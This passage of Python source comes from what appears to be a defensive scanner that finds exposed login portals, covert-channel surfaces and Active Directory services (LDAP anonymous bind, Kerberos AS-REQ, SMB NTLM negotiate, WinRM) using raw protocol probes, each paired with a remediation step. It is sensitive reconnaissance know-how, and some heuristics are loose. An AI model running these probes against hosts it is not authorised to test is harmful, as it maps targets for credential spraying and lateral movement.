            avg_ms = sum(timings) / len(timings)
            if avg_ms < 100:
                findings.append({
                    'severity': 'HIGH',
                    'title': 'API_NO_RATE_LIMITING',
                    'detail': (
                        f'host={host} port={port} path={api_path} '
                        f'spray_attempts={len(timings)} avg_response_ms={avg_ms:.1f} '
                        f'last_status={last_status} rate_limited=false '
                        f'note=5_rapid_API_auth_attempts_no_429_avg_sub_100ms '
                        f'indicator=API_auth_endpoint_lacks_rate_limiting '
                        f'action=confirm_endpoint_active_then_document_spraying_surface'
                    ),
                    'host': host,
                    'port': port,
                })
                break  # one confirmed active API path is sufficient

    # --- OWA / Exchange ---
    owa_result = _req('/owa/auth.owa')
    if owa_result is not None:
        owa_status, _, owa_body = owa_result
        owa_text = owa_body.decode('utf-8', errors='replace').lower()
        if owa_status in (200, 302) and bool(
            re.search(r'outlook|owa|exchange|microsoft', owa_text)
        ) or owa_status == 302:
            findings.append({
                'severity': 'HIGH',
                'title': 'OWA_LOGIN_SURFACE',
                'detail': (
                    f'host={host} port={port} path=/owa/auth.owa status={owa_status} '
                    f'note=Outlook_Web_Access_login_portal_detected '
                    f'indicator=Exchange_OWA_endpoint_reachable_credential_spray_target '
                    f'action=test_for_lockout_enable_MFA_restrict_to_known_IPs'
                ),
                'host': host,
                'port': port,
            })

    # --- ADFS ---
    adfs_result = _req('/adfs/ls/idpinitiatedsignon.aspx')
    if adfs_result is not None:
        adfs_status, _, adfs_body = adfs_result
        adfs_text = adfs_body.decode('utf-8', errors='replace').lower()
        if adfs_status in (200, 302) and bool(
            re.search(r'adfs|active.directory|federation|sign.in', adfs_text)
        ) or adfs_status == 302:
            findings.append({
                'severity': 'HIGH',
                'title': 'ADFS_SIGNIN_EXPOSED',
                'detail': (
                    f'host={host} port={port} path=/adfs/ls/idpinitiatedsignon.aspx '
                    f'status={adfs_status} '
                    f'note=ADFS_IdP_initiated_sign_on_page_reachable '
                    f'indicator=Active_Directory_Federation_Services_auth_surface_exposed '
                    f'action=restrict_to_internal_only_enforce_MFA_monitor_for_spray_patterns'
                ),
                'host': host,
                'port': port,
            })

    return findings


def detect_network_covert_channel(host, port=80, timeout=10.0) -> list:
    """Detect covert channel and protocol tunneling indicators.

    Checks DNS tunneling (long-label entropy), ICMP payload echo, HTTP header
    covert channel, TCP ISN timing, beaconing regularity, IPv6-over-IPv4
    tunnel exposure, and HTTP steganographic payload anomalies.

    Informed by:
    - CyberOps ch04: DNS tunneling and data exfiltration techniques
    - CyberOps ch12: Evasion/obfuscation via tunneling (SSH, DNS, IPv6, HTTP)
    - CyberOps ch13: Retrospective analysis and beacon interval detection
    """
    import time as _time
    import ssl as _ssl

    findings = []

    # ------------------------------------------------------------------
    # 1. DNS tunneling indicator -- long label query (>40 chars)
    # ch04: "DNS not intended for data transfer; attackers exploit it for
    # exfiltration because it is less inspected." Tools: iodine (Base32),
    # OzymanDNS (Base32/Base64), DNScat, dns2tcp. Detect via label length
    # and NOERROR responses to synthetic 64-char labels.
    # ------------------------------------------------------------------
    try:
        test_label = 'aabbccddeeffgghhiijjkkllmmnnooppqqrrssttuuvvwwxxyyzz0123456789ab'
        test_fqdn = test_label + '.probe.invalid'
        tx_id = os.urandom(2)
        # DNS header: ID, flags=0x0100 (standard query RD), QDCOUNT=1
        dns_hdr = tx_id + b'\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
        qname = b''
        for label in test_fqdn.split('.'):
            lb = label.encode('ascii')
            qname += bytes([len(lb)]) + lb
        qname += b'\x00'
        dns_pkt = dns_hdr + qname + b'\x00\x01\x00\x01'  # QTYPE=A, QCLASS=IN

        dns_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dns_sock.settimeout(min(timeout, 4.0))
        try:
            dns_sock.sendto(dns_pkt, (host, 53))
            resp, _ = dns_sock.recvfrom(512)
            if len(resp) >= 4 and (resp[3] & 0x0F) == 0:
                findings.append({
                    'severity': 'HIGH',
                    'title': 'DNS_TUNNELING_INDICATOR',
                    'detail': (
                        f'host={host} port=53 label_len={len(test_label)} '
                        f'rcode=NOERROR '
                        f'note=DNS_resolver_accepted_64-char_label_without_error '
                        f'indicator=permissive_resolver_compatible_with_DNS_tunnel_relay '
                        f'ref=CyberOps-ch04-dns-tunneling-iodine-dns2tcp '
                        f'action=enforce_DNS_label_length_limits_monitor_query_entropy'
                    ),
                    'host': host,
                    'port': 53,
                })
        except socket.timeout:
            pass
        finally:
            dns_sock.close()
    except Exception:
        pass

    # ------------------------------------------------------------------
    # 2. ICMP covert channel -- large payload echo
    # ch12: "Threat actors use ICMP tunneling to hide C2 traffic inside
    # ICMP echo payloads." Probe: ICMP echo request with 1024-byte
    # distinctive payload; confirm full payload echo in reply (type=0).
    # ------------------------------------------------------------------
    try:
        raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        raw_sock.settimeout(min(timeout, 5.0))
        icmp_id = os.getpid() & 0xFFFF
        icmp_seq = 0x0042
        payload = bytes(range(256)) * 4  # 1024 bytes, deterministic pattern
        hdr = struct.pack('!BBHHH', 8, 0, 0, icmp_id, icmp_seq)
        raw_bytes = hdr + payload
        if len(raw_bytes) % 2:
            raw_bytes += b'\x00'
        chk = 0
        for i in range(0, len(raw_bytes), 2):
            chk += (raw_bytes[i] << 8) | raw_bytes[i + 1]
        chk = (chk >> 16) + (chk & 0xFFFF)
        chk = ~(chk + (chk >> 16)) & 0xFFFF
        hdr = struct.pack('!BBHHH', 8, 0, chk, icmp_id, icmp_seq)
        pkt = hdr + payload
        raw_sock.sendto(pkt, (host, 0))
        try:
            reply, _ = raw_sock.recvfrom(2048)
            if len(reply) >= 28:
                icmp_part = reply[20:]  # skip 20-byte IP header
                if icmp_part[0] == 0:  # ICMP echo reply
                    echoed = icmp_part[8:8 + 32]
                    if echoed == payload[:32]:
                        findings.append({
                            'severity': 'HIGH',
                            'title': 'ICMP_COVERT_CHANNEL',
                            'detail': (
                                f'host={host} port=0 '
                                f'payload_size=1024 payload_echoed=true '
                                f'note=ICMP_echo_reflects_large_arbitrary_payload '
                                f'indicator=ICMP_tunnel_surface_confirmed '
                                f'ref=CyberOps-ch12-icmp-tunneling-evasion '
                                f'action=restrict_ICMP_payload_size_via_ACL_or_NGFW_DPI'
                            ),
                            'host': host,
                            'port': 0,
                        })
        except socket.timeout:
            pass
        raw_sock.close()
    except PermissionError:
        findings.append({
            'severity': 'INFO',
            'title': 'ICMP_COVERT_CHANNEL',
            'detail': (
                f'host={host} port=0 '
                f'note=raw_socket_requires_root_probe_skipped '
                f'action=re-run_as_root_to_probe_ICMP_covert_channel_surface'
            ),
            'host': host,
            'port': 0,
        })
    except Exception:
        pass

    # ------------------------------------------------------------------
    # 3. HTTP header covert channel
    # ch12: "HTTP tunneling routes traffic over ports 80/443 to evade
    # inspection." Header fields (Cookie, X-Forwarded-For, custom headers)
    # carry encoded C2 data. Probe with high-entropy header values.
    # ------------------------------------------------------------------
    try:
        covert_val = base64.b64encode(os.urandom(24)).decode()
        req = urllib.request.Request(
            f'http://{host}:{port}/',
            headers={
                'User-Agent': 'Mozilla/5.0 (compatible)',
                'X-Forwarded-For': '127.0.0.1',
                'Cookie': f'sid={covert_val}',
                'X-Trace-Id': base64.b64encode(b'\xde\xad\xbe\xef' + os.urandom(8)).decode(),
            }
        )
        try:
            with urllib.request.urlopen(req, timeout=min(timeout, 6.0)) as r:
                status = r.getcode()
                body_sample = r.read(512).decode('utf-8', errors='replace')
                reflected = covert_val[:12] in body_sample
                sev = 'HIGH' if reflected else 'MEDIUM'
                findings.append({
                    'severity': sev,
                    'title': 'HTTP_HEADER_COVERT_CHANNEL',
                    'detail': (
                        f'host={host} port={port} status={status} '
                        f'value_reflected={reflected} '
                        f'note=HTTP_endpoint_accepts_high-entropy_cookie_and_forged_XFF '
                        f'indicator=HTTP_surface_compatible_with_header-encoded_C2_beaconing '
                        f'ref=CyberOps-ch12-http-tunneling '
                        f'action=deploy_NGFW_HTTP_header_inspection_and_DPI_anomaly_detection'
                    ),
                    'host': host,
                    'port': port,
                })
        except urllib.error.URLError:
            pass
    except Exception:
        pass

    # ------------------------------------------------------------------
    # 4. TCP ISN covert channel -- arithmetic timing proxy
    # Some C2 implementations modulate TCP ISN values to encode data.
    # Direct ISN reads require raw sockets; this probe uses RTT delta
    # variance across 3 connections as a timing proxy. Near-zero variance
    # in consecutive RTT deltas indicates machine-precision scheduling
    # consistent with ISN modulation or timing covert channels.
    # ------------------------------------------------------------------
    try:
        rtt_samples = []
        for _ in range(3):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(min(timeout, 5.0))
                t0 = _time.monotonic()
                s.connect((host, port))
                rtt_samples.append(_time.monotonic() - t0)
                s.close()
            except Exception:
                pass
        if len(rtt_samples) >= 3:
            avg_rtt = sum(rtt_samples) / len(rtt_samples)
            diffs = [abs(rtt_samples[i + 1] - rtt_samples[i]) for i in range(len(rtt_samples) - 1)]
            avg_diff = sum(diffs) / max(len(diffs), 1)
            variance = sum((d - avg_diff) ** 2 for d in diffs) / max(len(diffs), 1)
            if variance < 1e-10 and avg_rtt > 0 and avg_diff > 0:
                findings.append({
                    'severity': 'HIGH',
                    'title': 'TCP_ISN_COVERT_CHANNEL',
                    'detail': (
                        f'host={host} port={port} '
                        f'avg_rtt_ms={avg_rtt * 1000:.3f} '
                        f'rtt_delta_variance={variance:.2e} '
                        f'note=TCP_connection_RTT_deltas_show_arithmetic_pattern '
                        f'indicator=potential_ISN_modulation_or_timing_covert_channel '
                        f'ref=CyberOps-ch12-covert-channel-timing '
                        f'action=deploy_NetFlow_ISN_randomness_analysis_per_RFC6528'
                    ),
                    'host': host,
                    'port': port,
                })
    except Exception:
        pass

    # ------------------------------------------------------------------
    # 5. Timing channel / beaconing -- low-variance periodic intervals
    # ch12: Attackers time C2 beacon intervals to machine precision to
    # avoid detection heuristics that rely on human-irregular timing.
    # Five connect samples; variance < 5 microseconds indicates
    # machine-driven fixed-interval beaconing.
    # ------------------------------------------------------------------
    try:
        timings = []
        for _ in range(5):
            try:
                t0 = _time.monotonic()
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(min(timeout, 4.0))
                s.connect((host, port))
                s.close()
                timings.append(_time.monotonic() - t0)
            except Exception:
                pass
        if len(timings) >= 4:
            avg = sum(timings) / len(timings)
            variance_us = (sum((t - avg) ** 2 for t in timings) / len(timings)) * 1_000_000
            if variance_us < 5.0 and avg > 0:
                findings.append({
                    'severity': 'MEDIUM',
                    'title': 'TIMING_CHANNEL_BEACONING',
                    'detail': (
                        f'host={host} port={port} '
                        f'avg_latency_ms={avg * 1000:.2f} '
                        f'variance_us={variance_us:.3f} '
                        f'note=connection_latency_variance_below_5us_machine-precision_interval '
                        f'indicator=sub-microsecond_timing_regularity_consistent_with_C2_beaconing '
                        f'ref=CyberOps-ch12-evasion-ch13-retrospective-analysis '
                        f'action=correlate_NetFlow_records_for_fixed-interval_beacon_pattern'
                    ),
                    'host': host,
                    'port': port,
                })
    except Exception:
        pass

    # ------------------------------------------------------------------
    # 6. IPv6 tunneling over IPv4 -- Teredo UDP 3544 and 6in4 TCP 4
    # ch12: "Attackers use IPv6 tunneling to bypass IPv4-only security
    # controls." Teredo (RFC 4380) encapsulates IPv6 in UDP port 3544.
    # 6in4 (RFC 4213) uses IP protocol 41; TCP port 4 is an open-relay
    # heuristic for 6in4 tunnel broker endpoints.
    # ------------------------------------------------------------------
    try:
        teredo = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        teredo.settimeout(min(timeout, 3.0))
        teredo.sendto(b'\x00\x00\x00\x00\x00\x00\x00\x00', (host, 3544))
        try:
            data, _ = teredo.recvfrom(256)
            findings.append({
                'severity': 'HIGH',
                'title': 'IPV6_TUNNEL_EXPOSED',
                'detail': (
                    f'host={host} port=3544 protocol=UDP '
                    f'tunnel_type=Teredo resp_len={len(data)} '
                    f'note=Teredo_IPv6-over-UDP_service_responding '
                    f'indicator=IPv6_transition_mechanism_exposed_bypasses_IPv4_ACLs '
                    f'ref=CyberOps-ch12-ipv6-tunneling-RFC4380 '
                    f'action=block_UDP_3544_audit_all_IPv6_transition_mechanisms'
                ),
                'host': host,
                'port': 3544,
            })
        except socket.timeout:
            pass
        teredo.close()
    except Exception:
        pass

    try:
        s6 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s6.settimeout(min(timeout, 3.0))
        s6.connect((host, 4))
        s6.close()
        findings.append({
            'severity': 'HIGH',
            'title': 'IPV6_TUNNEL_EXPOSED',
            'detail': (
                f'host={host} port=4 protocol=TCP '
                f'tunnel_type=6in4_IP-in-IP_relay_heuristic '
                f'note=host_accepts_TCP_on_port_4_potential_6in4_tunnel_broker '
                f'indicator=IPv6-over-IPv4_tunnel_surface_protocol_41_proxy '
                f'ref=CyberOps-ch12-6in4-protocol41-RFC4213 '
                f'action=audit_IPv6_transition_mechanisms_block_unused_tunnel_protocols'
            ),
            'host': host,
            'port': 4,
        })
    except (ConnectionRefusedError, socket.timeout, OSError):
        pass
    except Exception:
        pass

    # ------------------------------------------------------------------
    # 7. HTTP steganography -- image size vs. dimension anomaly
    # ch12: "Attackers embed data in image payloads to evade DPI."
    # PNG files with file size disproportionate to pixel dimensions
    # indicate appended or LSB-encoded covert data (~1-3 bytes/pixel
    # overhead). Threshold: > 8 bytes/pixel in a PNG is anomalous.
    # ------------------------------------------------------------------
    try:
        for img_path in ['/', '/logo.png', '/favicon.ico', '/img/logo.png', '/images/bg.png']:
            try:
                req = urllib.request.Request(
                    f'http://{host}:{port}{img_path}',
                    headers={'User-Agent': 'Mozilla/5.0 (compatible)'}
                )
                with urllib.request.urlopen(req, timeout=min(timeout, 5.0)) as r:
                    ct = r.headers.get('Content-Type', '')
                    try:
                        cl = int(r.headers.get('Content-Length', '0') or '0')
                    except ValueError:
                        cl = 0
                    body = r.read(1024)
                    sig_off = body.find(b'\x89PNG\r\n\x1a\n')
                    if sig_off >= 0 and len(body) >= sig_off + 24:
                        try:
                            w = struct.unpack('>I', body[sig_off + 16:sig_off + 20])[0]
                            h = struct.unpack('>I', body[sig_off + 20:sig_off + 24])[0]
                            if w > 0 and h > 0:
                                file_sz = cl if cl > 0 else len(body)
                                bpp = file_sz / (w * h)
                                if bpp > 8.0:
                                    findings.append({
                                        'severity': 'MEDIUM',
                                        'title': 'HTTP_STEGO_PAYLOAD',
                                        'detail': (
                                            f'host={host} port={port} path={img_path} '
                                            f'content_type={ct!r} '
                                            f'width={w} height={h} file_size={file_sz} '
                                            f'bytes_per_pixel={bpp:.2f} '
                                            f'note=PNG_file_size_disproportionate_to_pixel_dimensions '
                                            f'indicator=potential_LSB_steganographic_payload '
                                            f'ref=CyberOps-ch12-obfuscation-stego '
                                            f'action=inspect_image_entropy_and_LSB_patterns'
                                        ),
                                        'host': host,
                                        'port': port,
                                    })
                                    break
                        except struct.error:
                            pass
            except (urllib.error.URLError, Exception):
                continue
    except Exception:
        pass

    return findings


def detect_active_directory_attack_surface(host, port=389, timeout=10.0) -> list:
    """Detect exposed Active Directory / LDAP attack surface.

    Probes standard AD service ports: LDAP (389) with anonymous bind attempt
    and rootDSE enumeration, LDAPS (636), Global Catalog (3268/3269),
    Kerberos (88) with AS-REQ probe, SMB (445) with negotiate/NTLM check,
    WinRM (5985/5986), and RDP (3389).

    Active Directory services are the primary lateral movement pathway in
    Windows enterprise environments. Exposed service ports expand the attack
    surface for Kerberoasting, AS-REP roasting, NTLM relay, pass-the-hash,
    and remote code execution.

    Informed by:
    - CyberOps ch04: Authentication attacks, NTLM relay, pass-the-hash
    - CyberOps ch07: Identity and access management, privilege escalation paths
    - CyberOps ch03: Access control models and enforcement
    """
    import ssl as _ssl

    findings = []

    def _tcp_connect(h, p, to=None):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(to if to is not None else timeout)
            s.connect((h, p))
            return s
        except Exception:
            return None

    def _close(s):
        try:
            s.close()
        except Exception:
            pass

    # ------------------------------------------------------------------
    # 1. LDAP port 389 -- open check + anonymous bind + rootDSE enum
    # ch04/ch07: LDAP anonymous bind is a critical misconfiguration that
    # exposes all directory objects without authentication.
    # Anonymous bind probe bytes (RFC 4511 BER encoding):
    #   SEQUENCE { INTEGER 1, BindRequest { INTEGER 3, OCTET-STRING '', [0] '' } }
    # ------------------------------------------------------------------
    ldap_sock = _tcp_connect(host, 389)
    if ldap_sock:
        findings.append({
            'severity': 'HIGH',
            'title': 'LDAP_PORT_OPEN',
            'detail': (
                f'host={host} port=389 protocol=TCP '
                f'note=LDAP_directory_service_port_reachable '
                f'indicator=Active_Directory_or_OpenLDAP_enumeration_surface '
                f'ref=CyberOps-ch04-recon-ch07-IAM '
                f'action=restrict_389_to_authorized_subnets_via_network_ACL'
            ),
            'host': host,
            'port': 389,
        })

        anon_bind = b'\x30\x0c\x02\x01\x01\x60\x07\x02\x01\x03\x04\x00\x80\x00'
        try:
            ldap_sock.sendall(anon_bind)
            ldap_sock.settimeout(min(timeout, 5.0))
            resp = ldap_sock.recv(256)
            if resp and b'\x61' in resp:
                idx = resp.find(b'\x0a\x01')
                if idx >= 0 and idx + 2 < len(resp):
                    result_code = resp[idx + 2]
                    if result_code == 0:
                        findings.append({
                            'severity': 'CRITICAL',
                            'title': 'LDAP_ANONYMOUS_BIND',
                            'detail': (
                                f'host={host} port=389 result_code=0 '
                                f'note=LDAP_server_accepted_anonymous_bind '
                                f'indicator=unauthenticated_directory_enumeration_confirmed '
                                f'ref=CyberOps-ch04-auth-bypass-ch07-IAM '
                                f'action=disable_anonymous_LDAP_binds_require_SASL_or_LDAPS'
                            ),
                            'host': host,
                            'port': 389,
                        })

                        # rootDSE SearchRequest: base='' scope=baseObject filter=(objectClass=*)
                        # BER: SEQUENCE { messageID=2, SearchRequest { baseObject='',
                        #       scope=0, deref=0, size=0, time=0, typesOnly=false,
                        #       filter=[7] 'objectClass', attributes=SEQUENCE {} } }
                        rootdse_req = (
                            b'\x30\x25'          # SEQUENCE 37 bytes (LDAPMessage)
                            b'\x02\x01\x02'      # INTEGER 2 (messageID)
                            b'\x63\x20'          # [APPLICATION 3] 32 bytes (SearchRequest)
                            b'\x04\x00'          # OCTET STRING '' (baseObject)
                            b'\x0a\x01\x00'      # ENUMERATED 0 (scope=baseObject)
                            b'\x0a\x01\x00'      # ENUMERATED 0 (derefAliases=never)
                            b'\x02\x01\x00'      # INTEGER 0 (sizeLimit)
                            b'\x02\x01\x00'      # INTEGER 0 (timeLimit)
                            b'\x01\x01\x00'      # BOOLEAN FALSE (typesOnly)
                            b'\x87\x0b'          # [7] PRIMITIVE 11 bytes (present filter)
                            b'objectClass'       # filter=(objectClass=*)
                            b'\x30\x00'          # SEQUENCE 0 bytes (attributes=all)
                        )
                        try:
                            ldap_sock.sendall(rootdse_req)
                            ldap_sock.settimeout(min(timeout, 5.0))
                            rdse_resp = ldap_sock.recv(2048)
                            if rdse_resp and len(rdse_resp) > 50:
                                decoded = rdse_resp.decode('utf-8', errors='replace')
                                attrs = [kw for kw in [
                                    'namingContexts', 'defaultNamingContext',
                                    'dnsHostName', 'forestFunctionality',
                                    'domainFunctionality', 'ldapServiceName',
                                ] if kw.lower() in decoded.lower()]
                                findings.append({
                                    'severity': 'CRITICAL',
                                    'title': 'LDAP_ROOTDSE_UNAUTH',
                                    'detail': (
                                        f'host={host} port=389 resp_len={len(rdse_resp)} '
                                        f'attributes_detected={",".join(attrs) or "present"} '
                                        f'note=rootDSE_returned_directory_metadata_unauthenticated '
                                        f'indicator=domain_context_and_schema_info_exposed_without_auth '
                                        f'ref=CyberOps-ch04-recon-ch07-IAM '
                                        f'action=disable_null-base_anonymous_search_enforce_bind'
                                    ),
                                    'host': host,
                                    'port': 389,
                                })
                        except Exception:
                            pass
        except Exception:
            pass
        _close(ldap_sock)

    # ------------------------------------------------------------------
    # 2. LDAPS port 636 -- TLS connect
    # ch04/ch07: LDAPS prevents credential sniffing in transit but the
    # service is still a valid enumeration surface if anonymous binds
    # are permitted over TLS.
    # ------------------------------------------------------------------
    try:
        raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw.settimeout(timeout)
        raw.connect((host, 636))
        ctx = _ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = _ssl.CERT_NONE
        tls = ctx.wrap_socket(raw, server_hostname=host)
        _close(tls)
        findings.append({
            'severity': 'HIGH',
            'title': 'LDAPS_PORT_OPEN',
            'detail': (
                f'host={host} port=636 protocol=TLS '
                f'note=LDAPS_TLS_port_open '
                f'indicator=LDAP_over_TLS_surface_reachable '
                f'ref=CyberOps-ch04-access-control-ch07-IAM '
                f'action=validate_cert_chain_restrict_to_authorized_subnets'
            ),
            'host': host,
            'port': 636,
        })
    except (ConnectionRefusedError, socket.timeout):
        pass
    except Exception:
        pass

    # ------------------------------------------------------------------
    # 3. Global Catalog ports 3268 / 3269
    # GC ports enable forest-wide LDAP queries across all domains in an
    # AD forest. Exposing them externally allows cross-domain enumeration
    # without per-domain LDAP access.
    # ------------------------------------------------------------------
    for gc_port, gc_label in [(3268, 'GC_LDAP'), (3269, 'GC_LDAPS')]:
        s = _tcp_connect(host, gc_port, min(timeout, 5.0))
        if s:
            _close(s)
            findings.append({
                'severity': 'HIGH',
                'title': 'LDAP_GLOBAL_CATALOG_OPEN',
                'detail': (
                    f'host={host} port={gc_port} type={gc_label} '
                    f'note=LDAP_Global_Catalog_port_open '
                    f'indicator=cross-domain_forest-wide_enumeration_surface '
                    f'ref=CyberOps-ch04-recon-lateral-movement '
                    f'action=restrict_GC_ports_3268_3269_to_DC-to-DC_traffic_only'
                ),
                'host': host,
                'port': gc_port,
            })

    # ------------------------------------------------------------------
    # 4. Kerberos port 88 -- TCP connect + AS-REQ probe
    # ch04: Kerberos is the authentication backbone of AD. Exposed port 88
    # enables Kerberoasting (TGS-REQ for service accounts) and AS-REP
    # roasting (DONT_REQ_PREAUTH accounts) for offline hash cracking.
    # Probe: minimal AS-REQ shell that elicits KRB-ERROR from any live KDC.
    # KRB-ERROR tag=0x7e; AS-REP tag=0x6b.
    # ------------------------------------------------------------------
    kerb_sock = _tcp_connect(host, 88, min(timeout, 5.0))
    if kerb_sock:
        findings.append({
            'severity': 'HIGH',
            'title': 'KERBEROS_PORT_OPEN',
            'detail': (
                f'host={host} port=88 protocol=TCP '
                f'note=Kerberos_KDC_port_reachable '
                f'indicator=authentication_service_exposed_Kerberoasting_surface '
                f'ref=CyberOps-ch04-authentication-attacks '
                f'action=restrict_port_88_to_domain-member_subnets'
            ),
            'host': host,
            'port': 88,
        })

        try:
            # Minimal AS-REQ shell: pvno=5, msg-type=10, req-body with realm "XX"
            # A live KDC responds with KRB-ERROR confirming AS-REQ processing surface.
            asreq_body = (
                b'\x30\x1a'              # SEQUENCE 26 bytes (KerberosV5 message)
                b'\xa1\x03\x02\x01\x05'  # pvno [1] INTEGER 5
                b'\xa2\x03\x02\x01\x0a'  # msg-type [2] INTEGER 10 (AS-REQ)
                b'\xa4\x0e\x30\x0c'      # req-body [4] SEQUENCE 12 bytes
                b'\xa2\x04\x1b\x02'      # realm [2] GeneralString 2 bytes
                b'\x58\x58'              # "XX"
                b'\xa7\x04\x30\x02'      # etype [7] SEQUENCE 2 bytes
                b'\x00\x00'              # (stub etype list)
            )
            outer = b'\x6a' + bytes([len(asreq_body)]) + asreq_body
            tcp_frame = struct.pack('>I', len(outer)) + outer
            kerb_sock.sendall(tcp_frame)
            kerb_sock.settimeout(min(timeout, 5.0))
            krsp_hdr = kerb_sock.recv(4)
            if len(krsp_hdr) == 4:
                krsp_len = struct.unpack('>I', krsp_hdr)[0]
                krsp_body = kerb_sock.recv(min(krsp_len, 512))
                if krsp_body:
                    first_tag = krsp_body[0]
                    if first_tag == 0x7e:
                        findings.append({
                            'severity': 'CRITICAL',
                            'title': 'KERBEROS_NO_PREAUTH_SURFACE',
                            'detail': (
                                f'host={host} port=88 response=KRB_ERROR '
                                f'tag=0x{first_tag:02x} resp_len={len(krsp_body)} '
                                f'note=Kerberos_KDC_responded_to_AS-REQ_probe '
                                f'indicator=KDC_active_Kerberoasting_AS-REP_roasting_surface '
                                f'ref=CyberOps-ch04-Kerberos-auth-attacks '
                                f'action=enforce_pre-auth_disable_RC4_require_AES256_restrict_TGS'
                            ),
                            'host': host,
                            'port': 88,
                        })
                    elif first_tag == 0x6b:
                        findings.append({
                            'severity': 'CRITICAL',
                            'title': 'KERBEROS_NO_PREAUTH_SURFACE',
                            'detail': (
                                f'host={host} port=88 response=AS_REP_NO_PREAUTH '
                                f'tag=0x{first_tag:02x} resp_len={len(krsp_body)} '
                                f'note=KDC_issued_AS-REP_without_pre-authentication '
                                f'indicator=AS-REP_roasting_confirmed_offline_cracking_possible '
                                f'ref=CyberOps-ch04-Kerberos-auth-attacks '
                                f'action=require_pre-authentication_on_all_AD_accounts'
                            ),
                            'host': host,
                            'port': 88,
                        })
        except Exception:
            pass
        _close(kerb_sock)

    # ------------------------------------------------------------------
    # 5. SMB port 445 -- TCP connect + SMBv1 negotiate for NTLM exposure
    # ch04: SMB is the primary lateral movement vector for NTLM relay,
    # pass-the-hash, and EternalBlue (MS17-010). NTLMSSP in the negotiate
    # response confirms NTLM challenge-response surface is active.
    # ------------------------------------------------------------------
    smb_sock = _tcp_connect(host, 445, min(timeout, 5.0))
    if smb_sock:
        findings.append({
            'severity': 'HIGH',
            'title': 'SMB_PORT_OPEN',
            'detail': (
                f'host={host} port=445 protocol=TCP '
                f'note=SMB_port_open '
                f'indicator=lateral_movement_pass-the-hash_EternalBlue_NTLM-relay_surface '
                f'ref=CyberOps-ch04-network-attacks '
                f'action=restrict_445_to_authorized_hosts_disable_SMBv1_enable_signing'
            ),
            'host': host,
            'port': 445,
        })

        try:
            # SMBv1 Negotiate with EXTENDED_SECURITY flag to elicit NTLMSSP security blob
            dialect = b'\x02NT LM 0.12\x00'
            smb_hdr = (
                b'\xff\x53\x4d\x42'                           # SMB magic (4)
                b'\x72'                                        # SMB_COM_NEGOTIATE (1)
                b'\x00\x00\x00\x00'                           # NT Status (4)
                b'\x18'                                        # Flags (1)
                b'\x01\x28'                                    # Flags2 EXTENDED_SECURITY (2)
                b'\x00\x00'                                    # PID high (2)
                b'\x00\x00\x00\x00\x00\x00\x00\x00'          # Signature (8)
                b'\x00\x00'                                    # Reserved (2)
                b'\xff\xff'                                    # TreeID (2)
                b'\xff\xfe'                                    # PID (2)
                b'\x00\x00'                                    # UID (2)
                b'\x40\x00'                                    # MID (2)
            )
            wct = b'\x00'
            bcc = struct.pack('<H', len(dialect))
            body = smb_hdr + wct + bcc + dialect
            nb_hdr = struct.pack('>I', len(body))
            smb_sock.sendall(nb_hdr + body)
            smb_sock.settimeout(min(timeout, 5.0))
            resp = b''
            while len(resp) < 36:
                chunk = smb_sock.recv(512)
                if not chunk:
                    break
                resp += chunk
            if b'NTLMSSP' in resp:
                findings.append({
                    'severity': 'HIGH',
                    'title': 'SMB_NTLM_CHALLENGE_EXPOSED',
                    'detail': (
                        f'host={host} port=445 resp_len={len(resp)} ntlm_blob=true '
                        f'note=SMB_negotiate_response_contains_NTLMSSP_security_blob '
                        f'indicator=NTLM_challenge-response_relay_attack_surface_confirmed '
                        f'ref=CyberOps-ch04-NTLM-relay-pass-the-hash '
                        f'action=enable_SMB_signing_disable_NTLMv1_deploy_EPA'
                    ),
                    'host': host,
                    'port': 445,
                })
            elif len(resp) >= 36 and resp[4:8] in (b'\xff\x53\x4d\x42', b'\xfeSMB'):
                findings.append({
                    'severity': 'HIGH',
                    'title': 'SMB_NTLM_CHALLENGE_EXPOSED',
                    'detail': (
                        f'host={host} port=445 resp_len={len(resp)} ntlm_blob=false '
                        f'note=SMB_negotiate_response_received_NTLMSSP_not_visible '
                        f'indicator=SMB_negotiate_surface_confirmed '
                        f'ref=CyberOps-ch04-network-attacks '
                        f'action=enable_SMB_signing_disable_NTLMv1_restrict_access'
                    ),
                    'host': host,
                    'port': 445,
                })
        except Exception:
            pass
        _close(smb_sock)

    # ------------------------------------------------------------------
    # 6. WinRM ports 5985 / 5986 -- GET /wsman
    # ch04: WinRM exposes remote PowerShell execution (Enter-PSSession,
    # Invoke-Command). An exposed WinRM endpoint is a high-value target
    # for lateral movement via stolen credentials or NTLM relay.
    # ------------------------------------------------------------------
    for winrm_port, winrm_proto in [(5985, 'HTTP'), (5986, 'HTTPS')]:
        s = _tcp_connect(host, winrm_port, min(timeout, 4.0))
        if s:
            try:
                req = (
                    f'GET /wsman HTTP/1.1\r\n'
                    f'Host: {host}:{winrm_port}\r\n'
                    f'Connection: close\r\n\r\n'
                )
                s.sendall(req.encode())
                s.settimeout(min(timeout, 4.0))
                resp = s.recv(512)
                resp_text = resp.decode('utf-8', errors='replace') if resp else ''
            except Exception:
                resp_text = ''
            _close(s)
            wsman_sig = 'wsman' in resp_text.lower() or 'winrm' in resp_text.lower()
            http_sig = resp_text.startswith('HTTP/')
            findings.append({
                'severity': 'HIGH',
                'title': 'WINRM_EXPOSED',
                'detail': (
                    f'host={host} port={winrm_port} proto={winrm_proto} '
                    f'http_response={http_sig} wsman_signature={wsman_sig} '
                    f'note=WinRM_port_open '
                    f'indicator=remote_PowerShell_execution_lateral_movement_vector '
                    f'ref=CyberOps-ch04-remote-execution-attacks '
                    f'action=restrict_WinRM_to_management_hosts_enforce_HTTPS_disable_if_unused'
                ),
                'host': host,
                'port': winrm_port,
            })

    # ------------------------------------------------------------------
    # 7. RDP port 3389 -- TCP connect + TLS ClientHello
    # ch04: RDP is a top lateral movement and initial access vector.
    # BlueKeep (CVE-2019-0708) and DejaBlue affected unpatched endpoints.
